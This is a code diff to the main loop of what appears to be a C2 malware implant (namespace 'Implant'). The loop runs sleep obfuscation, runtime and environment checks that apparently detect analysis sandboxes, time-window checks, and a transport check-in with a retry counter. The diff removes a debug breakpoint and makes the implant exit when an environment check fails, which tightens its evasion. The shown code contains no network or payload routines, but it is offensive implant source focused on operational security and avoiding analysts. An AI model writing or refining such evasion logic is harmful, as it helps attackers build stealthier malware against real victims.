@@ -6,17 +6,16 @@ namespace Implant {
 
         do {
             Opsec::SleepObf();
-            Opsec::SeRuntimeCheck();
+            if (!Opsec::SeRuntimeCheck()) {
+                return_defer(ntstatus);
+            }
 
             if (!Opsec::CheckTime()) {
                 continue;
             }
 
             if (!Ctx->session.checkin && !Ctx->transport.outbound_queue) {
-                __debugbreak();
-                Opsec::SeCheckEnvironment();
-
-                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
+                if(!Opsec::SeCheckEnvironment()) {
                     return_defer(ntstatus);
                 }
             }
@@ -26,14 +25,12 @@ namespace Implant {
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->session.retry++;
 
-                if (Ctx->session.retry == 3) {
-                    break;
-                }
-            } else {
-                Ctx->session.retry = 0;
+                if (Ctx->session.retry == 3) { break; }
+                continue;
             }
-        }
-        while (ntstatus != ERROR_EXIT);
+
+            Ctx->session.retry = 0;
+        } while (ntstatus != ERROR_EXIT);
 
     defer:
         Memory::Context::ContextDestroy(Ctx);
